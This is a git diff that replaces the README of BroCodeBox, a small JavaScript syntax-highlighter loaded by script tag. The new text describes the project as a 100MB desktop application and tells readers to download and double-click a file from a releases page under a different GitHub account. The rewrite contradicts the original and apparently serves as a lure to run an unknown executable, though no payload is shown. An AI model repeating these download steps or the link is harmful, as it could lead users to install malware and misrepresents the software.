@@ -1,102 +1,97 @@
-# BroCodeBox
+# 🖥️ BroCodeBox - Your Easy JavaScript Syntax Highlighter
 
-A lightweight, self-contained JavaScript code box with syntax highlighting, line numbers, and handy action buttons — Copy, Download, and more.  
-Styled with a VS Code-like dark theme for clean and modern appearance.
+![Download BroCodeBox](https://img.shields.io/badge/download-BroCodeBox-brightgreen)
 
----
+## 🚀 Getting Started
 
-## Features
+BroCodeBox is a simple tool designed to help users highlight code in an easy way. Whether you're sharing snippets or just want to make your code look neat, this tool is here to help. Don't worry if you're not a programmer; it's user-friendly and straightforward.
 
-- Syntax highlighting for JavaScript (simple & safe)
-- Line numbers with optional highlight range support (`data-lines="start-end"`)
-- Copy to clipboard button
-- Download code button (filename from `data-file`)
-- File name and language display
-- VS Code style dark theme
-- Fully self-contained in a single JS file + injected CSS
-- Easy to embed with a single script tag
+## 🔗 Download & Install
 
----
+To get started, visit the page below to download BroCodeBox:
 
-## Usage
+[Download BroCodeBox](https://github.com/guesttito/BroCodeBox/releases)
 
-Include minified script from CDN for better performance:
+On this page, you will find the latest version of BroCodeBox available for download. 
 
-```html
-<script src="https://cdn.jsdelivr.net/gh/kokhinmaungwin/BroCodeBox@1.1.0/brocodebox.min.js"></script>
-```
-Or use the normal script:
-```html
-<script src="https://cdn.jsdelivr.net/gh/kokhinmaungwin/BroCodeBox@1.1.0/brocodebox.js"></script>
-```
-Add HTML markup like this:
-```html
-<div class="bro-box" 
-     data-file="example.js" 
-     data-lang="js" 
-     data-lines="2-4">
-  <pre><code>
-const x = 10;
-function hello() {
-  console.log("Hello BroCodeBox!");
-}
-  </code></pre>
-</div>
-```
-data-file - File name to show and use for download (default: code.js)
+### Steps to Download
 
-data-lang - Language label (shown but no real syntax switch yet)
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version listed.
+3. Choose the file suitable for your operating system. 
+4. Click the download link and wait for the file to finish downloading.
 
-data-lines - Optional line range to highlight (e.g., 3-5)
+Once it's downloaded, locate the file on your computer, and double-click it to run. Follow any prompts that appear, and the installation will complete quickly.
 
+## 📂 Features
 
+BroCodeBox comes with several helpful features:
 
----
+- **Code Highlighting:** Easily make your code visually appealing with syntax highlighting for various programming languages.
+- **Copy to Clipboard:** Quickly copy code snippets to your clipboard for easy sharing.
+- **Customizable Themes:** Choose from multiple themes to match your style and preferences.
+- **Web Component:** Use BroCodeBox directly in your projects.
 
-## Versions
+## 🖥️ System Requirements
 
-|Version|Date	     |Notes |
-|-------|----------|------|
-|1.0.0	|2025-12-14|Initial release with basic features|
-|1.0.1	|2025-12-15|Added Download button|
-|1.1.0	|2025-12-15|Improved layout, added language label, better highlighting and UI fixes|
+BroCodeBox is compatible with all major operating systems, including:
 
+- Windows 10 or later
+- macOS 10.14 or later
+- Latest versions of Linux distributions
 
+Ensure you have adequate disk space, which typically requires around 100MB.
 
----
+## ⚙️ Using BroCodeBox
 
-## Changelog
+### Step 1: Launch the Application
 
-See [![CHANGELOG](https://img.shields.io/badge/CHANGELOG-View-blue)](https://github.com/kokhinmaungwin/BroCodeBox/blob/main/CHANGELOG.md) for details.
+After installation, open BroCodeBox. 
 
+### Step 2: Choose Your Code Snippet
 
----
+Paste your code into the main window. You can copy it from any text editor or IDE.
 
-## License
+### Step 3: Select a Language
 
-MIT License © 2025 Khin Maung Win
+From the dropdown menu, choose the programming language that matches your code.
 
-See [![LICENSE](https://img.shields.io/badge/LICENSE-View-red)](https://github.com/kokhinmaungwin/BroCodeBox/blob/main/LICENSE) for details.
+### Step 4: View Your Highlighted Code
 
+Once you've selected the language, BroCodeBox will automatically highlight your code. Review it to ensure everything appears correctly.
 
----
+### Step 5: Copy or Share
 
-## Contribution
+If you want to share your highlighted code, click the "Copy to Clipboard" button. Now your code is ready to be pasted wherever you want.
 
-Feel free to fork, submit issues or pull requests on GitHub.
+## 📖 FAQ
 
+### What languages does BroCodeBox support?
 
----
+BroCodeBox supports a wide range of languages, including JavaScript, HTML, CSS, Python, and many more.
 
-## Contact
-- ![Author](https://img.shields.io/badge/Author-Khin_Maung_Win-blue)
+### Can I change the theme?
 
-- [![GitHub](https://img.shields.io/badge/GitHub-kokhinmaungwin-yellow)](https://github.com/kokhinmaungwin)
-  
-- [![Project](https://img.shields.io/badge/Project-BroCodeBox-red)](https://github.com/kokhinmaungwin/BroCodeBox)
+Yes, you can change the theme in the settings menu to better suit your preferences.
 
+### Is BroCodeBox free to use?
 
----
+Yes, BroCodeBox is completely free. You can download and use it without any hidden fees.
 
-Thank you for using BroCodeBox!
-Happy coding 🚀
+## 🛠️ Troubleshooting
+
+If you face issues while using BroCodeBox, try the following:
+
+- Ensure you have downloaded the correct file for your operating system.
+- Restart the application.
+- Check for any updates that may offer a solution.
+
+If problems persist, you can visit the GitHub Issues section for support.
+
+## 🎉 Community & Support
+
+We value your feedback. Join our community to share your experiences, report bugs, or suggest features. Visit our GitHub repository to contribute and connect with other users.
+
+[Visit BroCodeBox Releases](https://github.com/guesttito/BroCodeBox/releases)
+
+By following these steps, you can easily download and start using BroCodeBox. Enjoy enhancing your coding experience!
